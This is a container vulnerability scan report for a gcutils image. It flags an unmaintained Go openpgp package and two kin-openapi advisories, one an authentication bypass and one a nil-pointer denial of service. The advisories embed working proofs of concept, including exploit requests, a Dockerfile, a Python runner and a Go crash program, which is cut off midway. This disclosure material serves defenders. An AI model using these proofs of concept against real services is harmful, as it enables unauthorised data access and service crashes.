```yaml
╭ [0] ╭ Target: nmaguiar/gcutils:build (alpine 3.24.0) 
│     ├ Class : os-pkgs 
│     ╰ Type  : alpine 
├ [1] ╭ Target  : Java 
│     ├ Class   : lang-pkgs 
│     ├ Type    : jar 
│     ╰ Packages 
├ [2] ╭ Target  : Node.js 
│     ├ Class   : lang-pkgs 
│     ├ Type    : node-pkg 
│     ╰ Packages 
├ [3] ╭ Target  : Python 
│     ├ Class   : lang-pkgs 
│     ├ Type    : python-pkg 
│     ╰ Packages 
├ [4] ╭ Target         : usr/bin/prometheus 
│     ├ Class          : lang-pkgs 
│     ├ Type           : gobinary 
│     ├ Packages        
│     ╰ Vulnerabilities ─ [0] ╭ VulnerabilityID : GO-2026-5932 
│                             ├ PkgID           : golang.org/x/crypto@v0.53.0 
│                             ├ PkgName         : golang.org/x/crypto 
│                             ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/crypto@v0.53.0 
│                             │                  ╰ UID : 28dd7c39c48a1330 
│                             ├ InstalledVersion: v0.53.0 
│                             ├ Status          : affected 
│                             ├ Layer            ╭ Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe
│                             │                  │         92562dadc4ee6c7523d 
│                             │                  ╰ DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9
│                             │                            afbb07074e22b1af86c 
│                             ├ DataSource       ╭ ID  : govulndb 
│                             │                  ├ Name: The Go Vulnerability Database 
│                             │                  ╰ URL : https://pkg.go.dev/vuln/ 
│                             ├ Fingerprint     : sha256:244a572b1aeebd83716b4782378e67fbc43c4bc59cef133f1ca5d4
│                             │                   243e981ea8 
│                             ├ Title           : The golang.org/x/crypto/openpgp package is unmaintained,
│                             │                   unsafe by design, and has known security issues 
│                             ├ Description     : The golang.org/x/crypto/openpgp package is unsafe by design,
│                             │                   has numerous known security issues, is not maintained, and
│                             │                   should not be used.
│                             │                   
│                             │                   If you are required to interoperate with OpenPGP systems and
│                             │                   need a maintained package, consider
│                             │                   github.com/ProtonMail/go-crypto/openpgp which is a maintained
│                             │                    fork that aims to be a drop-in replacement for this
│                             │                   package. 
│                             ├ Severity        : UNKNOWN 
│                             ╰ References       ╭ [0]: https://go.dev/issue/44226 
│                                                ╰ [1]: https://pkg.go.dev/vuln/GO-2026-5932 
├ [5] ╭ Target         : usr/bin/promtool 
│     ├ Class          : lang-pkgs 
│     ├ Type           : gobinary 
│     ├ Packages        
│     ╰ Vulnerabilities ─ [0] ╭ VulnerabilityID : GO-2026-5932 
│                             ├ PkgID           : golang.org/x/crypto@v0.53.0 
│                             ├ PkgName         : golang.org/x/crypto 
│                             ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/crypto@v0.53.0 
│                             │                  ╰ UID : 855faedd270f0a78 
│                             ├ InstalledVersion: v0.53.0 
│                             ├ Status          : affected 
│                             ├ Layer            ╭ Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe
│                             │                  │         92562dadc4ee6c7523d 
│                             │                  ╰ DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9
│                             │                            afbb07074e22b1af86c 
│                             ├ DataSource       ╭ ID  : govulndb 
│                             │                  ├ Name: The Go Vulnerability Database 
│                             │                  ╰ URL : https://pkg.go.dev/vuln/ 
│                             ├ Fingerprint     : sha256:07e5503a475fe8b993c3994201f5c6213fd42a48684f97be329cd8
│                             │                   a9877a0258 
│                             ├ Title           : The golang.org/x/crypto/openpgp package is unmaintained,
│                             │                   unsafe by design, and has known security issues 
│                             ├ Description     : The golang.org/x/crypto/openpgp package is unsafe by design,
│                             │                   has numerous known security issues, is not maintained, and
│                             │                   should not be used.
│                             │                   
│                             │                   If you are required to interoperate with OpenPGP systems and
│                             │                   need a maintained package, consider
│                             │                   github.com/ProtonMail/go-crypto/openpgp which is a maintained
│                             │                    fork that aims to be a drop-in replacement for this
│                             │                   package. 
│                             ├ Severity        : UNKNOWN 
│                             ╰ References       ╭ [0]: https://go.dev/issue/44226 
│                                                ╰ [1]: https://pkg.go.dev/vuln/GO-2026-5932 
├ [6] ╭ Target         : usr/share/grafana/bin/grafana 
│     ├ Class          : lang-pkgs 
│     ├ Type           : gobinary 
│     ├ Packages        
│     ╰ Vulnerabilities ╭ [0] ╭ VulnerabilityID : GHSA-r277-6w6q-xmqw 
│                       │     ├ PkgID           : github.com/getkin/kin-openapi@v0.140.0 
│                       │     ├ PkgName         : github.com/getkin/kin-openapi 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/getkin/kin-openapi@v0.140.0 
│                       │     │                  ╰ UID : 569a48646b538692 
│                       │     ├ InstalledVersion: v0.140.0 
│                       │     ├ FixedVersion    : 0.144.0 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe
│                       │     │                  │         92562dadc4ee6c7523d 
│                       │     │                  ╰ DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9
│                       │     │                            afbb07074e22b1af86c 
│                       │     ├ SeveritySource  : ghsa 
│                       │     ├ PrimaryURL      : https://github.com/advisories/GHSA-r277-6w6q-xmqw 
│                       │     ├ DataSource       ╭ ID  : ghsa 
│                       │     │                  ├ Name: GitHub Security Advisory Go 
│                       │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
│                       │     │                          osystem%3Ago 
│                       │     ├ Fingerprint     : sha256:89598647b9d8e0820f0a9d02c904c0cb0a0d4c92e560edb9ba74a6
│                       │     │                   8198a94cb4 
│                       │     ├ Title           : kin-openapi: ValidationHandler.Load() Fail-Open
│                       │     │                   Authentication Bypass via NoopAuthenticationFunc Default 
│                       │     ├ Description     : ### Summary
│                       │     │                   `ValidationHandler.Load()` in `getkin/kin-openapi` silently
│                       │     │                   replaces a nil `AuthenticationFunc` with
│                       │     │                   `NoopAuthenticationFunc`, which always returns `nil` without
│                       │     │                   performing any credential check. Because this substitution
│                       │     │                   happens unconditionally when the caller omits the field,
│                       │     │                   every OpenAPI `security` requirement declared in the spec is
│                       │     │                   silently satisfied for unauthenticated requests. An
│                       │     │                   unauthenticated remote attacker can reach handlers for routes
│                       │     │                    whose OpenAPI operation requires an API key, OAuth token, or
│                       │     │                    any other security scheme if the application relies on
│                       │     │                   `ValidationHandler` as its enforcement middleware. 
│                       │     │                   
│                       │     │                   ### Details
│                       │     │                   `ValidationHandler` is an HTTP middleware exported by
│                       │     │                   `openapi3filter` that validates incoming requests and
│                       │     │                   responses against a loaded OpenAPI specification. Its
│                       │     │                   `Load()` method initialises default fields before the handler
│                       │     │                    begins serving:
│                       │     │                   ```go
│                       │     │                   // openapi3filter/validation_handler.go:47-49
│                       │     │                   if h.AuthenticationFunc == nil {
│                       │     │                       h.AuthenticationFunc = NoopAuthenticationFunc
│                       │     │                   }
│                       │     │                   ```
│                       │     │                   `NoopAuthenticationFunc` is defined as:
│                       │     │                   // openapi3filter/validation_handler.go:17-18
│                       │     │                   func NoopAuthenticationFunc(context.Context,
│                       │     │                   *AuthenticationInput) error { return nil }
│                       │     │                   It always returns `nil`, meaning every security scheme check
│                       │     │                   it handles is automatically approved.
│                       │     │                   When a request arrives, `ServeHTTP` → `before` →
│                       │     │                   `validateRequest` assembles a `RequestValidationInput` with
│                       │     │                   the current `AuthenticationFunc` (now the no-op) injected
│                       │     │                   into `Options`:
│                       │     │                   // openapi3filter/validation_handler.go:91-103
│                       │     │                   options := &Options{
│                       │     │                       AuthenticationFunc: h.AuthenticationFunc,
│                       │     │                   requestValidationInput := &RequestValidationInput{
│                       │     │                       Request:    r,
│                       │     │                       PathParams: pathParams,
│                       │     │                       Route:      route,
│                       │     │                       Options:    options,
│                       │     │                   if err = ValidateRequest(r.Context(),
│                       │     │                   requestValidationInput); err != nil {
│                       │     │                       return err
│                       │     │                   Inside `ValidateRequest`, each security requirement calls
│                       │     │                   `options.AuthenticationFunc`:
│                       │     │                   // openapi3filter/validate_request.go:436-438
│                       │     │                   f := options.AuthenticationFunc
│                       │     │                   if f == nil {
│                       │     │                       return ErrAuthenticationServiceMissing   // fail-closed
│                       │     │                   path — never reached via ValidationHandler
│                       │     │                   // ...
│                       │     │                   // openapi3filter/validate_request.go:497-503
│                       │     │                   if err := f(ctx, &AuthenticationInput{...}); err != nil {
│                       │     │                   Because `f` is the no-op (not `nil`), the
│                       │     │                   `ErrAuthenticationServiceMissing` guard is never triggered
│                       │     │                   and `f(...)` returns `nil`, clearing the security
│                       │     │                   requirement. Control then proceeds to the protected handler
│                       │     │                   (`validation_handler.go:61-62`).
│                       │     │                   The critical contradiction is that callers who use
│                       │     │                   `ValidateRequest` directly with a nil `AuthenticationFunc`
│                       │     │                   get fail-closed behavior (`ErrAuthenticationServiceMissing`),
│                       │     │                    while callers who use the higher-level `ValidationHandler`
│                       │     │                   with a nil `AuthenticationFunc` get fail-open behavior. Since
│                       │     │                    omitting `AuthenticationFunc` is the natural default, the
│                       │     │                   majority of real-world integrations are vulnerable.
│                       │     │                   Affected source file and line:
│                       │     │                   `openapi3filter/validation_handler.go:47–49` (commit
│                       │     │                   `30e2923`, tag `v0.143.0`).
│                       │     │                   ### PoC
│                       │     │                   **Environment**
│                       │     │                   Docker (any version supporting multi-stage builds)
│                       │     │                   Go 1.25 (inside the container via golang:1.25-alpine)
│                       │     │                   getkin/kin-openapi v0.143.0 (local source copy)
│                       │     │                   **Step 1 — Build the Docker image**
│                       │     │                   From the repository root (parent of `vuln-001/`):
│                       │     │                   ```bash
│                       │     │                   docker build \
│                       │     │                     -t vuln001-auth-bypass-poc \
│                       │     │                     -f vuln-001/Dockerfile \
│                       │     │                     reports/github_web_233_getkin__kin-openapi
│                       │     │                   The `Dockerfile` copies the local `kin-openapi` source into
│                       │     │                   `/kin-openapi/` inside the image and builds a Go binary
│                       │     │                   (`/poc-binary`) from `main.go`. The `go.mod` inside the image
│                       │     │                    uses a `replace` directive pointing to `/kin-openapi`, so no
│                       │     │                    network access to the Go module proxy is required.
│                       │     │                   **Step 2 — Run the container**
│                       │     │                   docker run --rm --network none vuln001-auth-bypass-poc
│                       │     │                   **Step 3 (alternative) — Use the Python helper**
│                       │     │                   python3 vuln-001/poc.py --no-cleanup
│                       │     │                   **What the PoC does**
│                       │     │                   `main.go` creates a temporary OpenAPI 3.0 spec that declares
│                       │     │                   `GET /secret` as protected by an `apiKey` security scheme:
│                       │     │                   ```yaml
│                       │     │                   paths:
│                       │     │                     /secret:
│                       │     │                       get:
│                       │     │                         security:
│                       │     │                           - apiKey: []
│                       │     │                   components:
│                       │     │                     securitySchemes:
│                       │     │                       apiKey:
│                       │     │                         type: apiKey
│                       │     │                         name: X-Api-Key
│                       │     │                         in: header
│                       │     │                   It then constructs a `ValidationHandler` **without** setting
│                       │     │                   `AuthenticationFunc`, calls `Load()`, and sends a request
│                       │     │                   with no `X-Api-Key` header:
│                       │     │                   ```http
│                       │     │                   GET /secret HTTP/1.1
│                       │     │                   Host: example.test
│                       │     │                   # X-Api-Key header is intentionally absent
│                       │     │                   **Expected (vulnerable) output**
│                       │     │                   === CONTRAST: Direct ValidateRequest with nil
│                       │     │                   AuthenticationFunc ===
│                       │     │                     Direct ValidateRequest (nil auth) => ERROR: security
│                       │     │                   requirements failed: missing AuthenticationFunc
│                       │     │                     -> Fail-CLOSED behavior confirmed: missing auth function is
│                       │     │                    rejected
│                       │     │                   === EXPLOIT: ValidationHandler.Load() with nil
│                       │     │                     OpenAPI spec defines: security: [{apiKey: []}] on GET
│                       │     │                   /secret
│                       │     │                     ValidationHandler.AuthenticationFunc: NOT SET (nil)
│                       │     │                     Load() will inject NoopAuthenticationFunc, which always
│                       │     │                   returns nil
│                       │     │                     Request:  GET /secret  (X-Api-Key header: absent)
│                       │     │                     Response: status=200  body="SECRET_DATA\n"
│                       │     │                   [EXPLOIT SUCCESS] Auth bypass confirmed!
│                       │     │                     Protected resource /secret returned SECRET_DATA without
│                       │     │                   credentials.
│                       │     │                     ValidationHandler.Load() silently injected
│                       │     │                   NoopAuthenticationFunc.
│                       │     │                     Security requirement was bypassed. VULN-001 REPRODUCED.
│                       │     │                   The contrast block confirms fail-closed behavior when
│                       │     │                   `ValidateRequest` is called directly. The exploit block
│                       │     │                   confirms fail-open behavior through `ValidationHandler`.
│                       │     │                   Status 200 and `SECRET_DATA` are returned without any
│                       │     │                   credential.
│                       │     │                   **Remediation patch**
│                       │     │                   ```diff
│                       │     │                   --- a/openapi3filter/validation_handler.go
│                       │     │                   +++ b/openapi3filter/validation_handler.go
│                       │     │                   @@
│                       │     │                     if h.Handler == nil {
│                       │     │                         h.Handler = http.DefaultServeMux
│                       │     │                     }
│                       │     │                   - if h.AuthenticationFunc == nil {
│                       │     │                   -     h.AuthenticationFunc = NoopAuthenticationFunc
│                       │     │                   - }
│                       │     │                     if h.ErrorEncoder == nil {
│                       │     │                         h.ErrorEncoder = DefaultErrorEncoder
│                       │     │                   After this change, a nil `AuthenticationFunc` propagates into
│                       │     │                    `ValidateRequest`, which returns
│                       │     │                   `ErrAuthenticationServiceMissing` and rejects the request.
│                       │     │                   Callers who genuinely want to skip authentication can still
│                       │     │                   opt in explicitly: `h.AuthenticationFunc =
│                       │     │                   openapi3filter.NoopAuthenticationFunc`.
│                       │     │                   ### Impact
│                       │     │                   This is an **authentication bypass** vulnerability (CWE-287).
│                       │     │                    Any application that:
│                       │     │                   1. uses `openapi3filter.ValidationHandler` as its HTTP
│                       │     │                   middleware, and
│                       │     │                   2. declares one or more `security` requirements in its
│                       │     │                   OpenAPI specification, and
│                       │     │                   3. does **not** explicitly set `AuthenticationFunc`,
│                       │     │                   is fully exposed. An unauthenticated remote attacker can send
│                       │     │                    requests to any protected endpoint without supplying
│                       │     │                   credentials; the middleware accepts the request and forwards
│                       │     │                   it to the underlying handler as if authentication had
│                       │     │                   succeeded.
│                       │     │                   Affected parties include all Go services that adopt
│                       │     │                   `ValidationHandler` as a drop-in validation layer and rely on
│                       │     │                    OpenAPI `security` declarations for access control without
│                       │     │                   adding a separate authentication layer upstream (e.g., an API
│                       │     │                    gateway or reverse proxy). Because the insecure behavior is
│                       │     │                   the default, developers following the "getting started" path
│                       │     │                   are affected without any additional mistake.
│                       │     │                   The confidentiality and integrity of data behind secured
│                       │     │                   endpoints are both at high risk. Availability is not directly
│                       │     │                    affected by this vulnerability.
│                       │     │                   ### Reproduction artifacts
│                       │     │                   #### `Dockerfile`
│                       │     │                   ```dockerfile
│                       │     │                   FROM golang:1.25-alpine
│                       │     │                   # Install git (needed by go mod for some packages)
│                       │     │                   RUN apk add --no-cache git
│                       │     │                   WORKDIR /workspace
│                       │     │                   # Copy the vulnerable kin-openapi repository as a local
│                       │     │                   module replacement
│                       │     │                   COPY repo/ /kin-openapi/
│                       │     │                   # Set up the PoC Go module
│                       │     │                   RUN mkdir -p /workspace/poc
│                       │     │                   WORKDIR /workspace/poc
│                       │     │                   # Create go.mod that uses the local copy of the vulnerable
│                       │     │                   kin-openapi
│                       │     │                   RUN cat > go.mod <<'EOF'
│                       │     │                   module kin-openapi-auth-bypass-poc
│                       │     │                   go 1.25
│                       │     │                   require github.com/getkin/kin-openapi v0.143.0
│                       │     │                   replace github.com/getkin/kin-openapi => /kin-openapi
│                       │     │                   EOF
│                       │     │                   # Copy the PoC source (build context is the parent directory
│                       │     │                   of vuln-001/)
│                       │     │                   COPY vuln-001/main.go /workspace/poc/main.go
│                       │     │                   # Resolve dependencies and build
│                       │     │                   RUN go mod tidy && \
│                       │     │                       go build -o /poc-binary .
│                       │     │                   # Run the PoC
│                       │     │                   CMD ["/poc-binary"]
│                       │     │                   #### `poc.py`
│                       │     │                   ```python
│                       │     │                   #!/usr/bin/env python3
│                       │     │                   """
│                       │     │                   PoC for VULN-001: ValidationHandler.Load() Fail-Open Auth
│                       │     │                   Bypass via NoopAuthenticationFunc Default
│                       │     │                   Repository: getkin/kin-openapi v0.143.0
│                       │     │                   CWE: CWE-287 (Improper Authentication)
│                       │     │                   CVSS: 9.1 (Critical)
│                       │     │                   Vulnerability Summary:
│                       │     │                       ValidationHandler.Load() silently replaces a nil
│                       │     │                   AuthenticationFunc with NoopAuthenticationFunc.
│                       │     │                       NoopAuthenticationFunc always returns nil (no error), so
│                       │     │                   any OpenAPI security requirement
│                       │     │                       passes without validation when the user forgets to set
│                       │     │                   AuthenticationFunc.
│                       │     │                       Contrast: ValidateRequest() with nil AuthenticationFunc
│                       │     │                   returns ErrAuthenticationServiceMissing
│                       │     │                       (fail-closed). ValidationHandler.Load() breaks this
│                       │     │                   guarantee (fail-open).
│                       │     │                   Usage:
│                       │     │                       python3 poc.py [--build-dir <dir>] [--image <name>]
│                       │     │                   [--no-cleanup]
│                       │     │                   import argparse
│                       │     │                   import os
│                       │     │                   import subprocess
│                       │     │                   import sys
│                       │     │                   import json
│                       │     │                   IMAGE_NAME = "vuln001-auth-bypass-poc"
│                       │     │                   SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
│                       │     │                   REPO_DIR = os.path.join(os.path.dirname(SCRIPT_DIR), "repo")
│                       │     │                   SUCCESS_MARKER = "[EXPLOIT SUCCESS]"
│                       │     │                   EXPECTED_STATUS = "status=200"
│                       │     │                   EXPECTED_BODY = 'body="SECRET_DATA\\n"'
│                       │     │                   def run(cmd, **kwargs):
│                       │     │                       """Run a shell command and return (returncode, stdout,
│                       │     │                   stderr)."""
│                       │     │                       print(f"[CMD] {' '.join(cmd)}")
│                       │     │                       result = subprocess.run(cmd, capture_output=True,
│                       │     │                   text=True, **kwargs)
│                       │     │                       if result.stdout:
│                       │     │                           print(result.stdout, end="")
│                       │     │                       if result.stderr:
│                       │     │                           print(result.stderr, end="", file=sys.stderr)
│                       │     │                       return result.returncode, result.stdout, result.stderr
│                       │     │                   def build_image(build_dir):
│                       │     │                       """Build the Docker image containing the PoC binary."""
│                       │     │                       print("\n[*] Building Docker image ...")
│                       │     │                       rc, stdout, stderr = run([
│                       │     │                           "docker", "build",
│                       │     │                           "--build-arg", f"REPO_DIR={REPO_DIR}",
│                       │     │                           "-t", IMAGE_NAME,
│                       │     │                           "-f", os.path.join(build_dir, "Dockerfile"),
│                       │     │                           # Build context is the reports root so both
│                       │     │                   Dockerfile and repo/ are reachable
│                       │     │                           os.path.dirname(build_dir),
│                       │     │                       ])
│                       │     │                       if rc != 0:
│                       │     │                           print(f"[ERROR] Docker build failed (exit {rc})",
│                       │     │                   file=sys.stderr)
│                       │     │                           sys.exit(rc)
│                       │     │                       print("[*] Docker build succeeded.")
│                       │     │                       return f"docker build -t {IMAGE_NAME} -f
│                       │     │                   {os.path.join(build_dir, 'Dockerfile')}
│                       │     │                   {os.path.dirname(build_dir)}"
│                       │     │                   def run_container():
│                       │     │                       """Run the container and capture output."""
│                       │     │                       print("\n[*] Running PoC container ...")
│                       │     │                           "docker", "run", "--rm",
│                       │     │                           "--network", "none",   # no network access needed
│                       │     │                           IMAGE_NAME,
│                       │     │                       combined = stdout + stderr
│                       │     │                       return rc, combined
│                       │     │                   def evaluate(exit_code, output):
│                       │     │                       """Determine whether the exploit was confirmed."""
│                       │     │                       passed = (
│                       │     │                           exit_code == 0
│                       │     │                           and SUCCESS_MARKER in output
│                       │     │                           and EXPECTED_STATUS in output
│                       │     │                           and EXPECTED_BODY in output
│                       │     │                       )
│                       │     │                       return passed
│                       │     │                   def cleanup_image():
│                       │     │                       """Remove the Docker image."""
│                       │     │                       print(f"\n[*] Removing Docker image {IMAGE_NAME} ...")
│                       │     │                       run(["docker", "rmi", "-f", IMAGE_NAME])
│                       │     │                   def main():
│                       │     │                       global IMAGE_NAME
│                       │     │                       parser = argparse.ArgumentParser(description="VULN-001
│                       │     │                   Auth Bypass PoC runner")
│                       │     │                       parser.add_argument("--build-dir", default=SCRIPT_DIR,
│                       │     │                                           help="Directory containing Dockerfile
│                       │     │                    and main.go")
│                       │     │                       parser.add_argument("--image", default=IMAGE_NAME,
│                       │     │                                           help="Docker image name to
│                       │     │                   build/run")
│                       │     │                       parser.add_argument("--no-cleanup", action="store_true",
│                       │     │                                           help="Keep the Docker image after the
│                       │     │                    run")
│                       │     │                       args = parser.parse_args()
│                       │     │                       IMAGE_NAME = args.image
│                       │     │                       print("=" * 60)
│                       │     │                       print("VULN-001 PoC: Auth Bypass via
│                       │     │                   NoopAuthenticationFunc Default")
│                       │     │                       print(f"  Build dir : {args.build_dir}")
│                       │     │                       print(f"  Repo dir  : {REPO_DIR}")
│                       │     │                       print(f"  Image     : {IMAGE_NAME}")
│                       │     │                       build_cmd = build_image(args.build_dir)
│                       │     │                       run_cmd = f"docker run --rm --network none {IMAGE_NAME}"
│                       │     │                       exit_code, output = run_container()
│                       │     │                       if not args.no_cleanup:
│                       │     │                           cleanup_image()
│                       │     │                       passed = evaluate(exit_code, output)
│                       │     │                       print("\n" + "=" * 60)
│                       │     │                       if passed:
│                       │     │                           print("[RESULT] PASS — Auth bypass CONFIRMED")
│                       │     │                           print("  The protected handler returned SECRET_DATA
│                       │     │                   without credentials.")
│                       │     │                           print("  ValidationHandler.Load() injected
│                       │     │                   NoopAuthenticationFunc silently.")
│                       │     │                       else:
│                       │     │                           print(f"[RESULT] FAIL — Exploit not confirmed
│                       │     │                   (exit={exit_code})")
│                       │     │                       print(f"\nContainer exit code : {exit_code}")
│                       │     │                       print(f"Success marker found: {SUCCESS_MARKER in
│                       │     │                   output}")
│                       │     │                       print(f"Status 200 found    : {EXPECTED_STATUS in
│                       │     │                       print(f"Secret body found   : {EXPECTED_BODY in
│                       │     │                       # Exit with code that signals pass/fail
│                       │     │                       sys.exit(0 if passed else 1)
│                       │     │                   if __name__ == "__main__":
│                       │     │                       main()
│                       │     │                   ``` 
│                       │     ├ Severity        : CRITICAL 
│                       │     ├ VendorSeverity   ─ ghsa: 4 
│                       │     ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N 
│                       │     │                         ╰ V3Score : 9.1 
│                       │     ├ References       ╭ [0]: https://github.com/getkin/kin-openapi 
│                       │     │                  ├ [1]: https://github.com/getkin/kin-openapi/commit/f0407d53b0
│                       │     │                  │      730280266f454b755010e7eeb985da 
│                       │     │                  ├ [2]: https://github.com/getkin/kin-openapi/releases/tag/v0.1
│                       │     │                  │      44.0 
│                       │     │                  ╰ [3]: https://github.com/getkin/kin-openapi/security/advisori
│                       │     │                         es/GHSA-r277-6w6q-xmqw 
│                       │     ├ PublishedDate   : 2026-07-24T16:52:05Z 
│                       │     ╰ LastModifiedDate: 2026-07-24T16:52:05Z 
│                       ├ [1] ╭ VulnerabilityID : GHSA-jpcw-4wr7-c3vq 
│                       │     ├ PkgID           : github.com/getkin/kin-openapi@v0.140.0 
│                       │     ├ PkgName         : github.com/getkin/kin-openapi 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/getkin/kin-openapi@v0.140.0 
│                       │     │                  ╰ UID : 569a48646b538692 
│                       │     ├ InstalledVersion: v0.140.0 
│                       │     ├ FixedVersion    : 0.144.0 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe
│                       │     │                  │         92562dadc4ee6c7523d 
│                       │     │                  ╰ DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9
│                       │     │                            afbb07074e22b1af86c 
│                       │     ├ SeveritySource  : ghsa 
│                       │     ├ PrimaryURL      : https://github.com/advisories/GHSA-jpcw-4wr7-c3vq 
│                       │     ├ DataSource       ╭ ID  : ghsa 
│                       │     │                  ├ Name: GitHub Security Advisory Go 
│                       │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
│                       │     │                          osystem%3Ago 
│                       │     ├ Fingerprint     : sha256:55ffbe87f915340846b31da03f5aad03851337f4d02fde81644942
│                       │     │                   5fc57d96c9 
│                       │     ├ Title           : kin-openapi openapi3filter: unauthenticated nil-pointer panic
│                       │     │                    when validating a request against a `content` parameter
│                       │     │                   whose media type has no schema 
│                       │     ├ Description     : | Field | Value |
│                       │     │                   |---|---|
│                       │     │                   | Ecosystem | Go |
│                       │     │                   | Package | `github.com/getkin/kin-openapi` |
│                       │     │                   | Affected versions | `<= 0.143.0` (introduced in `v0.2.0`,
│                       │     │                   PR #90, 2019-05-07; reproduced on `HEAD` `30e2923`) |
│                       │     │                   | Patched versions | 0.144.0 |
│                       │     │                   ---
│                       │     │                   
│                       │     │                   ### Summary
│                       │     │                   `openapi3filter.ValidateRequest` contains a
│                       │     │                   NULL-pointer-dereference denial of service: any
│                       │     │                   **unauthenticated** client can crash the request-validation
│                       │     │                   path with a **single** HTTP request. When an operation
│                       │     │                   declares a `content` parameter (as opposed to a `schema`
│                       │     │                   parameter) whose media type object has **no `schema`**,
│                       │     │                   request validation dereferences that missing schema and
│                       │     │                   panics. The document is legal under the OpenAPI Specification
│                       │     │                    — kin-openapi's own `doc.Validate()` accepts it — and the
│                       │     │                   defect affects **both OpenAPI 3.0.x and 3.1.x**. Depending on
│                       │     │                    how the library is wired into the server (see Impact), this
│                       │     │                   ranges from a per-request abort with unbounded panic-log
│                       │     │                   growth to a full remote process crash.
│                       │     │                   ### Details
│                       │     │                   The decoder used for `content` parameters when no custom
│                       │     │                   `ParamDecoder` is configured (the library default),
│                       │     │                   `defaultContentParameterDecoder`, dereferences the media-type
│                       │     │                    schema without a nil check.
│                       │     │                   `openapi3filter/req_resp_decoder.go`, around line 197:
│                       │     │                   ```go
│                       │     │                   mt := content.Get("application/json")
│                       │     │                   if mt == nil {                       // media-type OBJECT is
│                       │     │                   guarded ...
│                       │     │                       err = fmt.Errorf("parameter %q has no content schema",
│                       │     │                   param.Name)
│                       │     │                       return
│                       │     │                   }
│                       │     │                   outSchema = mt.Schema.Value          // ... but mt.Schema is
│                       │     │                   NOT — panics when nil
│                       │     │                   ```
│                       │     │                   The function guards `param.Content == nil`, `len(content) !=
│                       │     │                   1`, and `mt == nil`, but never `mt.Schema == nil`.
│                       │     │                   **Why a schema-less content parameter is legal** (so the sink
│                       │     │                    is reachable — `doc.Validate()` returns no error), in both
│                       │     │                   3.0.x and 3.1.x:
│                       │     │                   - `openapi3/parameter.go` — `Parameter.Validate` only
│                       │     │                   enforces *exactly one of `schema` XOR `content`*; a parameter
│                       │     │                    with `content` (and no `schema`) satisfies it.
│                       │     │                   - `openapi3/media_type.go` — `MediaType.Validate` validates
│                       │     │                   the schema **only when it is non-nil**, so an absent schema
│                       │     │                   is not a validation error.
│                       │     │                   **Call path to the panic:**
│                       │     │                   ValidateRequest                         
│                       │     │                   openapi3filter/validate_request.go:83
│                       │     │                     └─ ValidateParameter                  
│                       │     │                   openapi3filter/validate_request.go:177   (parameter.Content
│                       │     │                   != nil)
│                       │     │                          └─ decodeContentParameter        
│                       │     │                   openapi3filter/req_resp_decoder.go:166   (attacker supplies
│                       │     │                   value ⇒ found)
│                       │     │                               └─ defaultContentParameterDecoder  
│                       │     │                   openapi3filter/req_resp_decoder.go:197   ← nil deref / panic
│                       │     │                   **Authentication note:** `ValidateRequest` validates security
│                       │     │                    *before* parameters, but the panic is reachable **without
│                       │     │                   credentials** whenever the target operation declares no
│                       │     │                   security requirement, or when no `AuthenticationFunc` is
│                       │     │                   configured (it is opt-in). A single unauthenticated operation
│                       │     │                    anywhere in the served spec is sufficient. If an operation
│                       │     │                   *does* declare security and a rejecting `AuthenticationFunc`
│                       │     │                   is wired, that request is rejected before decoding.
│                       │     │                   ### PoC
│                       │     │                   Reproduced end-to-end against `HEAD` (`30e2923`) with a real
│                       │     │                   `net/http` server and a stock `http.Client`.
│                       │     │                   **1. Minimal OpenAPI 3.0.3 document** (legal —
│                       │     │                   `doc.Validate()` passes). The `cfg` query parameter uses
│                       │     │                   `content` with an `application/json` media type that has **no
│                       │     │                    `schema`**:
│                       │     │                   ```yaml
│                       │     │                   openapi: 3.0.3
│                       │     │                   info: {title: poc, version: "1.0.0"}
│                       │     │                   paths:
│                       │     │                     /c:
│                       │     │                       get:
│                       │     │                         parameters:
│                       │     │                           - name: cfg
│                       │     │                             in: query
│                       │     │                             content:
│                       │     │                               application/json: {}      # media type object
│                       │     │                   with NO schema
│                       │     │                         responses:
│                       │     │                           "200": {description: ok}
│                       │     │                   **2. A complete, self-contained program.** Drop this into a
│                       │     │                   directory inside a checkout of
│                       │     │                   `github.com/getkin/kin-openapi` and run it with `go run .`.
│                       │     │                   It loads the document above, asserts `doc.Validate()` accepts
│                       │     │                    it (proving reachability), serves it behind request
│                       │     │                   validation exactly as the recommended middleware does, and
│                       │     │                   sends one unauthenticated `GET /c?cfg=1`:
│                       │     │                   package main
│                       │     │                   import (
│                       │     │                   	"context"
│                       │     │                   	"fmt"
│                       │     │                   	"net/http"
│                       │     │                   	"net/http/httptest"
│                       │     │                   	"github.com/getkin/kin-openapi/openapi3"
│                       │     │                   	"github.com/getkin/kin-openapi/openapi3filter"
│                       │     │                   	"github.com/getkin/kin-openapi/routers/gorillamux"
│                       │     │                   )
│                       │     │                   const spec = `
│                       │     │                   `
│                       │     │                   func main() {
│                       │     │                   	loader := openapi3.NewLoader()
│                       │     │                   	doc, err := loader.LoadFromData([]byte(spec))
│                       │     │                   	if err != nil {
│                       │     │                   		panic(err)
│                       │     │                   	}
│                       │     │                   	// Reachability: the malformed-but-legal document must
│                       │     │                   validate.
│                       │     │                   	if err := doc.Validate(context.Background()); err != nil {
│                       │     │                   		panic("doc.Validate rejected the spec, not reachable: " +
│                       │     │                   err.Error())
│                       │     │                   	router, err := gorillamux.NewRouter(doc)
